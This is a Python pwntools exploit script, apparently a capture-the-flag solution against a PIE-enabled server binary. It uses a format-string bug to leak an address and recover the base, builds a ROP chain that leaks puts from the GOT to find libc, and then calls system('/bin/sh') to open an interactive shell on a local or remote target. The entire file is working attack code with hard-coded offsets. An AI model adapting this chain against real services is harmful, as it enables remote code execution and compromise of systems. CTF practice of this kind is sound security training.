#!/usr/bin/env python3

from pwn import *

exe = ELF("./pie_server_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    context.log_level = 'debug'
    # good luck pwning :)

    offset = 264
    subtobase = 0x1224
    poprdi_offset = 0x12ab
    ret_offset = 0x1016
    puts_offset = 0x79e60
    system_offset = 0x50050
    binsh_offset = 0x19ce43

    r.sendlineafter(b':', '%{}$p'.format(15))
    r.recvuntil(b'Hello ')
    leaked_addr = int(r.recvline(), 16)
    info("Leaked address : %#x", leaked_addr)
    pie_base = leaked_addr - subtobase
    exe.address = pie_base
    info("Base Address : %#x", exe.address)
    poprdi = pie_base + poprdi_offset
    info('POP RDI : %#x', poprdi)
    ret = pie_base + ret_offset

    payload = flat({offset: [poprdi, exe.got.puts, exe.plt.puts, exe.symbols.vuln]})
    r.sendlineafter(b':P', payload)
    print(r.recvlines(2))
    got_puts = unpack(r.recv()[:6].ljust(8, b'\x00'))
    info("GOT puts : %#x", got_puts)
    libcbase = got_puts - puts_offset
    info("LibC Base : %#x", libcbase)
    system = libcbase + system_offset
    info("System : %#x", system)
    binsh = libcbase + binsh_offset
    info("BinSh : %#x", system)

    payload = flat({offset: [poprdi, binsh, ret, system]})
    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()
